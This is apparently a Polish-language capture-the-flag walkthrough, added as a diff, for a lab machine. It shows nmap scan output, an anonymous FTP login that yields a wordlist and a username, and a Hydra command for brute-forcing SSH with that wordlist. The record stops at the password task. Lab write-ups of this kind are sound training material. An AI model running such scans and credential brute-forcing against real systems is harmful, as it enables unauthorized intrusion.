@@ -1,0 +1,61 @@
+  Zadanie 1. Pierwszym naszym krokiem będzie wdrożenie maszyny. Więc zaczynam Start Machine.
+  Zadanie 2. Find open ports on the machine: Posłużmy się tutaj nmapem za pomocą przełączników nmap -sS -sV -A MACHINE_IP
+  Wyniki skanownia: 
+  
+  
+  Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 13:17 EDT
+Nmap scan report for 10.10.120.209
+Host is up (0.061s latency).
+Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.73.11
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
+|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
+|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Linux 5.4 (90%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Linux 2.6.32 - 3.1 (89%), Infomir MAG-250 set-top box (89%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 49158/tcp)
+HOP RTT      ADDRESS
+1   60.43 ms 10.8.0.1
+2   61.37 ms 10.10.120.209
+
+Jak widzimy na porcie FTP można się zalogować anonimowo więc zobaczmy co tam się znajduje. W wyniku skanownia widzimy, że mamy wgląd do dwóch plików locks.txt, task.txt.
+Na drodze napotkaliśmy problem |  229 Entering Extended Passive Mode (|||30447|) Po sprawdzeniu tego w internecie dowiedziałem się nic bo na stronie IBM jest wyjaśnienie.
+Którego kompletnie nie rozumie XD, następnie zobaczyłem następne rozwiązanie i okazało się całkiem proste, wystarczy wpisać   passive   i polecenia będę działać,
+normalnie. Tak jak w skanowaniu nmap, po wpisaniu ls wyświetlają się nam 2 pliki.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+Następnie pobierzmy sobie te pliki za pomocą get: get locks.txt, get task.txt i sprawdźmy co tam się znajduje.
+w locks.txt znajduje się masa symobli.
+w task.txt znajduję się kto napisał listę zadań
+  Zadanie 3. Who wrote the task list? Lin, jak dostaliśmy tą odpowiedź? Wszystko jest wytłumaczone w zadaniu powyżej.
+  Zadanie 4. What service can you bruteforce with the text file found? Odpowiedzią będzie SSH i w tym przypadku wykorzystamy listę locks.txt, które udało nam się pobrać
+ z FTP, więc zaczynamy.
+  Zadanie 5. What is the users password? Wykorzystamy do tego zadania Hydre, hydra -l lin -P locks.txt MACHINE_IP 22
+
+
+
